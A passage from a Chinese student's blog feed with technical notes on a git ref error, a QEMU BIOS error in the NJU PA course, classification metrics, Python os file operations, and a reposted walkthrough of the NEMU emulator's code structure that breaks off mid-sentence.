id="200"></li><li><p>执行下面的操作再进行push操作，成功执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm .git/refs/heads/pa2</span><br></pre></td></tr></table></figure></li></ol><h1 id="3-参考"><a class="markdownIt-Anchor" href="#3-参考"></a> 3 参考</h1><ul><li><a href="https://stackoverflow.com/questions/20694882/how-do-i-delete-a-local-git-branch-when-it-cant-look-up-commit-object-in-refs" target="_blank" rel="noopener">How do I delete a local git branch when it can’t look up commit object in ‘refs/heads’?</a></li><li><a href="https://zhuanlan.zhihu.com/p/426003354" target="_blank" rel="noopener">解决git报错fatal: could not parse HEAD</a></li><li><a href="https://blog.csdn.net/SMonkeyKing/article/details/89850416" target="_blank" rel="noopener">【git操作】强制切换到本地某个分支</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PA报错之qemu: could not load PC BIOS &#39;bios-256k.bin&#39;</title>
      <link href="/2022/05/10/PA%E6%8A%A5%E9%94%99%E4%B9%8Bqemu-could-not-load-PC-BIOS-bios-256k-bin/"/>
      <url>/2022/05/10/PA%E6%8A%A5%E9%94%99%E4%B9%8Bqemu-could-not-load-PC-BIOS-bios-256k-bin/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-报错"><a class="markdownIt-Anchor" href="#1-报错"></a> 1 报错</h1><p>开启diff_test，nemu再make run后报错：</p><img src="https://s2.loli.net/2022/05/10/mGoDxkP4RLQbIjd.png" width="600" height="400" alt="图片名称" align="center" id="198"><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>下面这些链接与遇到的问题相似，<strong>但是并未解决</strong></p><ul><li><a href="https://blog.csdn.net/zhangyexinaisurui/article/details/81806572" target="_blank" rel="noopener">qemu: could not load PC BIOS ‘bios-256k.bin’</a></li><li><a href="https://mlog.club/article/4454010" target="_blank" rel="noopener">由于缺少BIOS而无法启动KVM VM</a></li><li><a href="https://techglimpse.com/qemu-system-x86-command-error-solution/" target="_blank" rel="noopener">How to Fix Error – qemu: could not load PC BIOS ‘bios.bin’?</a></li></ul><p><strong>下面的方法解决了问题：</strong></p><p>自行编译一个 带i386,x86以及包含相关文件如’bios256k.bin’的qemu版本即可</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/37329713" target="_blank" rel="noopener">QEMU虚拟机编译使用实践</a></p>]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模型的评价指标</title>
      <link href="/2022/04/26/%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/"/>
      <url>/2022/04/26/%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>评估在测试集上计算</p></blockquote><h1 id="1-基本"><a class="markdownIt-Anchor" href="#1-基本"></a> 1 基本</h1><ul><li><strong>TP</strong>（True positives）：代表软件样本被认为是此类型，实际标签正是此类型；</li><li><strong>TN</strong>（True negatives）代表软件样本被认为不是此类型，实际标签不是此类型；</li><li><strong>FP</strong>（False positives）：代表软件样本被认为是此类型，实际标签不是此类型；</li><li><strong>FN</strong>（False negatives）：代表软件样本被认为不是此类型，实际标签正是此类型。</li></ul><h1 id="2-准确率accuracy"><a class="markdownIt-Anchor" href="#2-准确率accuracy"></a> 2 准确率（Accuracy）</h1><p>被预测正确的比例：<strong>Accuracy = (TP+TN) / (TP+TN+FP+FN)</strong></p><p>样本不平均的情况，此时模型评估不能仅仅依靠准确率。因此需要再结合F1值（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>−</mo><mi>s</mi><mi>c</mi><mi>o</mi><mi>r</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">F_1-score</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.68333em;"></span><span class="strut bottom" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit" style="margin-right:0.13889em;">F</span><span class="vlist"><span style="top:0.15em;margin-right:0.05em;margin-left:-0.13889em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord mathrm">1</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mbin">−</span><span class="mord mathit">s</span><span class="mord mathit">c</span><span class="mord mathit">o</span><span class="mord mathit" style="margin-right:0.02778em;">r</span><span class="mord mathit">e</span></span></span></span>）</p><h1 id="3-精确率precision"><a class="markdownIt-Anchor" href="#3-精确率precision"></a> 3 精确率（Precision）</h1><p>&quot;正确被预测为正(TP)&quot;占所有&quot;实际被预测为正的(TP+FP)&quot;的比例（混淆矩阵中除以所在的那一列之和），可信度</p><p><strong>Precision = TP / (TP+FP)</strong></p><h1 id="4-召回率recall"><a class="markdownIt-Anchor" href="#4-召回率recall"></a> 4 召回率（Recall）</h1><p>&quot;正确被预测为正(TP)&quot;占所有&quot;应该被预测为正(TP+FN)&quot;的比例（混淆矩阵中除以所在的那一行之和），查全率</p><p><strong>Recall = TP / (TP+FN)</strong></p><h1 id="5-f1值f1-score"><a class="markdownIt-Anchor" href="#5-f1值f1-score"></a> 5 F1值（F1-score）</h1><p>同时考虑了精确率和召回率，precison和recall的调和平均值(?)</p><p><strong>F1 = 2*Recall*Precision / (Recall + Precision)</strong></p><h1 id="6-macro-f1"><a class="markdownIt-Anchor" href="#6-macro-f1"></a> 6 Macro F1</h1><p>将n分类的评价拆成n个二分类的评价，计算每个二分类的F1 score，n个F1 score的平均值即为Macro F1。</p><h1 id="7-micro-f1"><a class="markdownIt-Anchor" href="#7-micro-f1"></a> 7 Micro F1</h1><p>将n分类的评价拆成n个二分类的评价，将n个二分类评价的TP、FP、TN、FN对应相加，计算评价准确率和召回率，由这2个准确率和召回率计算的F1 score即为Micro F1。<br>(TP + FP) / (TP + TN + FP + FN)，实际上就是accuracy，分母就是输入分类器的预测样本个数，分子就是预测正确的样本个数（无论类别）。</p><p>一般来讲，Macro F1、Micro F1高的分类效果好。Macro F1受样本数量少的类别影响大。<br>宏平均比微平均更合理，但也不是说微平均一无是处，具体使用哪种评测机制，还是要取决于数据集中样本分布。</p><h1 id="8-加权平均f1"><a class="markdownIt-Anchor" href="#8-加权平均f1"></a> 8 加权平均F1(?)</h1>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-os模块-文件(夹)操作</title>
      <link href="/2022/04/23/Python-os%E6%A8%A1%E5%9D%97-%E6%96%87%E4%BB%B6-%E5%A4%B9-%E6%93%8D%E4%BD%9C/"/>
      <url>/2022/04/23/Python-os%E6%A8%A1%E5%9D%97-%E6%96%87%E4%BB%B6-%E5%A4%B9-%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-判断文件夹是否存在"><a class="markdownIt-Anchor" href="#1-判断文件夹是否存在"></a> 1 判断文件(夹)是否存在</h1><p><strong>参考</strong>：<a href="https://www.cnblogs.com/jhao/p/7243043.html" target="_blank" rel="noopener">Python判断文件是否存在的三种方法</a></p><p><code>os</code>模块中的<code>os.path.exists()</code>方法用于检验文件是否存在。</p><p>判断文件(夹)是否存在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.exists(path)</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"></span><br><span class="line">os.path.exists(path)</span><br><span class="line"><span class="comment">#False</span></span><br></pre></td></tr></table></figure><p><strong>问题</strong>：如果文件夹和文件同路径+同名会出现bug。</p><p>只检查文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.isfile(<span class="string">"test-data"</span>)</span><br></pre></td></tr></table></figure><h1 id="2-创建目录"><a class="markdownIt-Anchor" href="#2-创建目录"></a> 2 创建目录</h1><p><strong>参考</strong>：<a href="https://blog.csdn.net/MuWinter/article/details/77215768" target="_blank" rel="noopener">python创建目录（文件夹）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.path.exists(path) <span class="comment"># 判断一个目录是否存在</span></span><br><span class="line"></span><br><span class="line">os.makedirs(path) <span class="comment"># 创建多级目录</span></span><br><span class="line"></span><br><span class="line">os.mkdir(path) <span class="comment"># 创建单级目录</span></span><br></pre></td></tr></table></figure><h1 id="3-复制文件"><a class="markdownIt-Anchor" href="#3-复制文件"></a> 3 复制文件</h1><p><strong>参考</strong>：<a href="https://zhuanlan.zhihu.com/p/35725217" target="_blank" rel="noopener">用Python复制文件的9个方法</a></p><p>这是运行任何系统命令的最常用方式。使用 system() 方法，你可以调用 subshell 中的任何命令。在内部，该方法将调用 C 语言的标准库函数。该方法返回该命令的退出状态。</p><p>对于 Windows 系统：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'copy 1.txt.py 2.txt.py'</span>)</span><br><span class="line">os.system(<span class="string">f'copy <span class="subst">&#123;source&#125;</span> <span class="subst">&#123;target&#125;</span>'</span>)</span><br></pre></td></tr></table></figure><p>对于 Liunx 系统：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'cp 1.txt.py 2.txt.py'</span>)</span><br></pre></td></tr></table></figure><p>速度较慢，大量文件复制效果不佳。</p><h1 id="4-路径拼接"><a class="markdownIt-Anchor" href="#4-路径拼接"></a> 4 路径拼接</h1><p>os.path.join()函数用于路径拼接文件路径：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">dir = <span class="string">"xxx"</span></span><br><span class="line">file_name = <span class="string">"xxx"</span></span><br><span class="line"></span><br><span class="line">path = os.path.join(dir, file_name)</span><br></pre></td></tr></table></figure><h1 id="5-删除文件夹"><a class="markdownIt-Anchor" href="#5-删除文件夹"></a> 5 删除文件(夹)</h1><p><strong>参考</strong>：<a href="https://developer.51cto.com/article/648822.html" target="_blank" rel="noopener">Python中删除文件的几种方法</a></p><p><strong>删除文件</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.remove(path)</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：如果文件在之前被打开，会出现报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    os.remove(file_path)</span><br><span class="line">PermissionError: [WinError <span class="number">32</span>] 另一个程序正在使用此文件，进程无法访问。: <span class="string">'data3\\dataset\\test\\Benign\\4447.txt'</span></span><br></pre></td></tr></table></figure><p>所以删除前要关闭文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_path = os.path.join(type_dir, name)</span><br><span class="line">f = open(file_path, <span class="string">"r"</span>)</span><br><span class="line">f.close()</span><br><span class="line">os.remove(file_path)</span><br></pre></td></tr></table></figure><hr><p><strong>删除目录</strong>：Python中的<code>os.remove()</code>方法用于删除文件路径。此方法无法删除目录。如果指定的路径是目录，则该方法将引发OSError。可以使用下面代码删除目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.rmdir(dir_path)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PA答疑之代码框架</title>
      <link href="/2022/04/23/PA%E7%AD%94%E7%96%91%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6/"/>
      <url>/2022/04/23/PA%E7%AD%94%E7%96%91%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><strong>转载</strong>：<a href="http://www.stardustdl.top/posts/learning/nju-icspa-analytics-nemu/" target="_blank" rel="noopener">NJU ICS Programming Assignment 代码分析 - NEMU</a></p></blockquote><blockquote><p>部分内容框架代码并不包含（如扩展的 Debug 宏），均为我为编码而添加的内容。采用 <code>a_b</code> 方式命名的多为原内容，采用 <code>aB</code> 方式命名的多为补充内容。由于此项目是 NJU ICS PA 的一部分，其中会包含与相关项目的互操作内容。</p></blockquote><p>NEMU (NJU EMUlator) 是在 Linux 上的一个 n86（x86 子集）模拟器，模拟了基本计算机系统的功能（内存，CPU等）。包含了：</p><ul><li>内存</li><li>CPU，寄存器</li><li>调试器（监视器）</li></ul><h1 id="1-框架代码结构"><a class="markdownIt-Anchor" href="#1-框架代码结构"></a> 1 框架代码结构</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nanos-lite/</span><br><span class="line">navy-apps/</span><br><span class="line">nexus-am/</span><br><span class="line">nemu/               <span class="comment"># NEMU 项目</span></span><br><span class="line">    build/          <span class="comment"># 构建输出文件夹</span></span><br><span class="line">        nemu        <span class="comment"># NEMU 主程序（可执行文件）</span></span><br><span class="line">    include/        <span class="comment"># 头文件</span></span><br><span class="line">    src/            <span class="comment"># 源码文件</span></span><br><span class="line">    tools/          <span class="comment"># 工具文件</span></span><br><span class="line">    runall.sh       <span class="comment"># 测试 AM cputest 测试集 （nexus-am/tests/cputest）</span></span><br><span class="line">    Makefile        <span class="comment"># NEMU 构建命令</span></span><br><span class="line">    Makefile.git    <span class="comment"># NEMU Git 记录命令</span></span><br></pre></td></tr></table></figure><p>nemu部分：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">nemu</span><br><span class="line">├── include                         <span class="comment">#   存放全局使用的头文件 </span></span><br><span class="line">|    ├── common.h                    <span class="comment">#   公用的头文件 </span></span><br><span class="line">|    ├── cpu</span><br><span class="line">|    |    ├── decode.h                <span class="comment">#   译码相关</span></span><br><span class="line">|    |    ├── exec.h                  <span class="comment">#   执行相关 </span></span><br><span class="line">|    |    ├── reg.h                   <span class="comment">#   寄存器结构体的定义 </span></span><br><span class="line">|    |    └── rtl.h                   <span class="comment">#   RTL指令 </span></span><br><span class="line">|    ├── debug.h                     <span class="comment">#   一些方便调试用的宏 </span></span><br><span class="line">|    ├── device                      <span class="comment">#   设备相关 </span></span><br><span class="line">|    ├── macro.h                     <span class="comment">#   一些方便的宏定义 </span></span><br><span class="line">|    ├── memory                      <span class="comment">#   访问内存相关 </span></span><br><span class="line">|    ├── monitor</span><br><span class="line">|    |    ├── expr.h</span><br><span class="line">|    |    ├── monitor.h</span><br><span class="line">|    |    └── watchpoint.h            <span class="comment">#   监视点相关 </span></span><br><span class="line">|    └── nemu.h</span><br><span class="line">├── Makefile                        <span class="comment">#   指示NEMU的编译和链接 </span></span><br><span class="line">├── Makefile.git                    <span class="comment">#   git版本控制相关 </span></span><br><span class="line">├── runall.sh                       <span class="comment">#   一键测试脚本 </span></span><br><span class="line">└── src                             <span class="comment">#   源文件</span></span><br><span class="line">    ├── cpu</span><br><span class="line">    |    ├── decode                  <span class="comment">#   译码相关</span></span><br><span class="line">    |    ├── <span class="built_in">exec</span>                    <span class="comment">#   执行相关 </span></span><br><span class="line">    |    ├── intr.c                  <span class="comment">#   中断处理相关</span></span><br><span class="line">    |    └── reg.c                   <span class="comment">#   寄存器相关    </span></span><br><span class="line">    ├── device                      <span class="comment">#   设备相关</span></span><br><span class="line">    ├── main.c                        </span><br><span class="line">    ├── memory</span><br><span class="line">    |    └── memory.c</span><br><span class="line">    ├── misc</span><br><span class="line">    |    └── logo.c                  <span class="comment">#   "i386"的logo</span></span><br><span class="line">    └── monitor</span><br><span class="line">        ├── cpu-exec.c              <span class="comment">#   指令执行的主循环</span></span><br><span class="line">        ├── diff-test</span><br><span class="line">        ├── debug                   <span class="comment">#   简易调试器相关</span></span><br><span class="line">        |    ├── expr.c              <span class="comment">#   表达式求值的实现</span></span><br><span class="line">        |    ├── ui.c                <span class="comment">#   用户界面相关    </span></span><br><span class="line">        |    └── watchpoint.c        <span class="comment">#   监视点的实现</span></span><br><span class="line">        └── monitor.c</span><br></pre></td></tr></table></figure><h1 id="2-include"><a class="markdownIt-Anchor" href="#2-include"></a> 2 include/</h1><h2 id="21-nemuh"><a class="markdownIt-Anchor" href="#21-nemuh"></a> 2.1 nemu.h</h2><p>基础头文件。包含了 <code>commom.h</code>，<code>memory/memory.h</code>，<code>cpu/reg.h</code></p><h2 id="22-macroh"><a class="markdownIt-Anchor" href="#22-macroh"></a> 2.2 macro.h</h2><p>定义了一些字符串连接宏 <code>concat</code> 等</p><h2 id="23-commonh"><a class="markdownIt-Anchor" href="#23-commonh"></a> 2.3 common.h</h2><p>定义了一些类型别名。</p><table><thead><tr><th style="text-align:center">类型别名</th><th style="text-align:center">原类型</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>rtlreg_t</code></td><td style="text-align:center"><code>uint32_t</code></td><td style="text-align:center">RTL寄存器</td></tr><tr><td style="text-align:center"><code>vaddr_t</code></td><td style="text-align:center"><code>uint32_t</code></td><td style="text-align:center">虚拟地址</td></tr><tr><td style="text-align:center"><code>paddr_t</code></td><td style="text-align:center"><code>uint32_t</code></td><td style="text-align:center">物理地址</td></tr><tr><td style="text-align:center"><code>ioaddr_t</code></td><td style="text-align:center"><code>uint16_t</code></td><td style="text-align:center">I/O 端口地址</td></tr></tbody></table><ul><li><code>relreg_t</code> 多用于寄存器访问</li><li><code>vaddr_t</code> <code>paddr_t</code> 多用于内存访问</li><li><code>ioaddr_t</code> 多用于设备 I/O 端口访问</li></ul><p>定义了一些控制编译方式的宏。</p><table><thead><tr><th style="text-align:center">宏</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>DEBUG</code></td><td style="text-align:center">启用调试</td></tr><tr><td style="text-align:center"><code>DIFF_TEST</code></td><td style="text-align:center">启用 diff-test</td></tr><tr><td style="text-align:center"><code>HAS_IOE</code></td><td style="text-align:center">启用输入输出扩展</td></tr></tbody></table><ul><li><code>DIFF_TEST</code> 可启用一个差异测试工具，参见 <code>tools/qemu-diff</code> 部分。</li><li><code>HAS_IOE</code> 启用输入输出设备，参见设备部分。</li></ul><h2 id="24-debugh"><a class="markdownIt-Anchor" href="#24-debugh"></a> 2.4 debug.h</h2><p>定义了便于调试的宏。</p><table><thead><tr><th style="text-align:center">宏</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Log_write(format, ...)</code></td><td style="text-align:center">仅记录日志</td></tr><tr><td style="text-align:center"><code>printflog(format, ...)</code></td><td style="text-align:center">显示文本并记录日志</td></tr><tr><td style="text-align:center"><code>Log(format, ...)</code></td><td style="text-align:center">对 <code>printflog</code> 的扩展，包含当前文件，行，函数</td></tr><tr><td style="text-align:center"><code>Info(format, ...)</code></td><td style="text-align:center">对 <code>Log</code> 的扩展，日志级别：提示</td></tr><tr><td style="text-align:center"><code>Warning(format, ...)</code></td><td style="text-align:center">对 <code>Log</code> 的扩展，日志级别：警告</td></tr><tr><td style="text-align:center"><code>Error(format, ...)</code></td><td style="text-align:center">对 <code>Log</code> 的扩展，日志级别：错误</td></tr><tr><td style="text-align:center"><code>panic(format, ...)</code></td><td style="text-align:center">强制退出，显示文本并记录日志</td></tr><tr><td style="text-align:center"><code>Assert(cond [, format, ...])</code></td><td style="text-align:center">设置断言，失败时强制退出，显示文本并记录日志</td></tr><tr><td style="text-align:center"><code>TODO()</code></td><td style="text-align:center">标识待完成项，执行时会触发 <code>panic</code></td></tr></tbody></table><h2 id="25-cpu"><a class="markdownIt-Anchor" href="#25-cpu"></a> 2.5 cpu/</h2><h3 id="251-regh"><a class="markdownIt-Anchor" href="#251-regh"></a> 2.5.1 reg.h</h3><p>定义了寄存器结构，和辅助寄存器的一些宏和函数。</p><ul><li>外部数组 <code>regsl, regsw, regsb</code> 不同寄存器名。实现在 <code>src/cpu/reg.c</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">char</span>* regsl[];</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">char</span>* regsw[];</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">char</span>* regsb[];</span><br></pre></td></tr></table></figure><h4 id="结构体-cpu_state"><a class="markdownIt-Anchor" href="#结构体-cpu_state"></a> 结构体 CPU_state</h4><p>寄存器结构，包含了所有寄存器，均为无符号整数。</p><ul><li>对于 8 个通用寄存器，内部以 <code>gpr</code> 数组为基础结构，提供 <code>eax</code> 等别名方便访问。寄存器按照 i386 指令中寄存器标号顺序排列。可使用 <code>_16,_8[0],_8[1]</code> 访问寄存器低位部分。</li><li><code>eip</code> 当前执行指令位置寄存器</li><li><code>eflags</code>标志位寄存器（使用匿名结构体，可直接访问<code>CF,OF,ZF,SF</code>）<ul><li><code>eflags</code> 初始化为 <code>0x2</code></li></ul></li><li><code>cs,ss,ds,es,fs,gs</code>程序段寄存器（仅为支持 diff-test）<ul><li><code>cs</code> 初始化为 <code>8</code></li></ul></li><li><code>idtr</code>：48 位寄存器，存放 IDT (Interrupt Descriptor Table, 中断描述符表)的首地址和长度<ul><li><code>limit</code> 16位，长度，单位：字节</li><li><code>base</code> 32位，IDT 基地址</li></ul></li></ul><table><thead><tr><th style="text-align:center">函数/宏</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>reg_l(index)</code></td><td style="text-align:center">获取指定下标处寄存器32位值</td></tr><tr><td style="text-align:center"><code>reg_w(index)</code></td><td style="text-align:center">获取指定下标处寄存器低16位值</td></tr><tr><td style="text-align:center"><code>reg_b(index)</code></td><td style="text-align:center">获取指定下标处寄存器低8位值</td></tr><tr><td style="text-align:center"><code>reg_name(index,width)</code></td><td style="text-align:center">根据下标和位宽获得寄存器名</td></tr></tbody></table><blockquote><p>寄存器存储在变量 <code>cpu</code> 中。</p></blockquote><h4 id="枚举"><a class="markdownIt-Anchor" href="#枚举"></a> 枚举</h4><p>定义了形如 <code>R_NAME</code> 的寄存器枚举，其顺序与寄存器结构中的顺序一致。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123; R_EAX, R_ECX, R_EDX, R_EBX, R_ESP, R_EBP, R_ESI, R_EDI &#125;;</span><br><span class="line"><span class="keyword">enum</span> &#123; R_AX, R_CX, R_DX, R_BX, R_SP, R_BP, R_SI, R_DI &#125;;</span><br><span class="line"><span class="keyword">enum</span> &#123; R_AL, R_CL, R_DL, R_BL, R_AH, R_CH, R_DH, R_BH &#125;;</span><br></pre></td></tr></table></figure><h3 id="252-decodeh"><a class="markdownIt-Anchor" href="#252-decodeh"></a> 2.5.2 decode.h</h3><p>定义了用于指令译码的结构和函数。</p><h4 id="结构体-operand"><a class="markdownIt-Anchor" href="#结构体-operand"></a> 结构体 Operand</h4><p>操作数。</p><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>type</code></td><td style="text-align:left">类型（见下方枚举）</td></tr><tr><td style="text-align:left"><code>width</code></td><td style="text-align:left">位宽</td></tr><tr><td style="text-align:left"><code>val</code></td><td style="text-align:left">实际值</td></tr><tr><td style="text-align:left"><code>str</code></td><td style="text-align:left">原串（用于调试输出）</td></tr><tr><td style="text-align:left"><code>reg</code></td><td style="text-align:left">寄存器下标</td></tr><tr><td style="text-align:left"><code>addr</code></td><td style="text-align:left">内存地址</td></tr><tr><td style="text-align:left"><code>imm</code></td><td style="text-align:left">立即数</td></tr><tr><td style="text-align:left"><code>simm</code></td><td style="text-align:left">带符号立即数</td></tr></tbody></table><h4 id="结构体-decodeinfo"><a class="markdownIt-Anchor" href="#结构体-decodeinfo"></a> 结构体 DecodeInfo</h4><p>单条命令译码结果。</p><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th><th style="text-align:left">对应x86指令部分</th></tr></thead><tbody><tr><td style="text-align:left"><code>opcode</code></td><td style="text-align:left">指令码</td><td style="text-align:left">opcode</td></tr><tr><td style="text-align:left"><code>seq_eip</code></td><td style="text-align:left">序列 EIP 位置</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>is_operand_size_16</code></td><td style="text-align:left">标识操作数是否为 16 位</td><td style="text-align:left">operand-size prefix</td></tr><tr><td style="text-align:left"><code>ext_opcode</code></td><td style="text-align:left">额外指令码</td><td style="text-align:left">ModR/M 中 opcode</td></tr><tr><td style="text-align:left"><code>is_jmp</code></td><td style="text-align:left">标识是否为跳转语句</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>jmp_eip</code></td><td style="text-align:left">跳转目标（绝对地址），仅对于跳转语句</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>src</code></td><td style="text-align:left">源操作数</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>src2</code></td><td style="text-align:left">第二个源操作数</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>dest</code></td><td style="text-align:left">目标操作数</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>assembly</code></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>asm_buf</code></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>p</code></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><ul><li><code>seq_eip</code> 随译码过程改变，最终停留在需要译码的下一个位置，可根据这一值实现 eip 更新。</li><li><code>is_operand_size_16</code> 多用于实现单命令存在 16 位，32 位两个版本的情况</li><li><code>ext_opcode</code> 用于实现 <code>sub /5</code> 这种根据第二个指令码 <code>/5</code> 